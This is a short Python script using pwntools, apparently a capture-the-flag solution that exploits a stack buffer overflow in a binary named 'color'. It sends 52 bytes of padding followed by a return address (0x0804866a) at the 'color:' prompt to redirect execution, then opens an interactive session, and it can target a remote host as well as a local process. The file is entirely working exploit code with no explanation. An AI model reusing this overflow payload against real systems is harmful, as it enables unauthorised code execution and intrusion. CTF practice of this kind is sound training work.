from pwn import *

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

gdbscript = '''
init-pwndbg
continue
'''.format(**locals())

exe = "/home/color/color"
elf = context.binary = ELF(exe, checksec=False)
context.log_level = 'debug'

io = start()

input()
padding = 52

payload = flat(
    b"A" * padding,
    p32(0x0804866a)
)

io.sendlineafter(b"color:",payload)

io.interactive()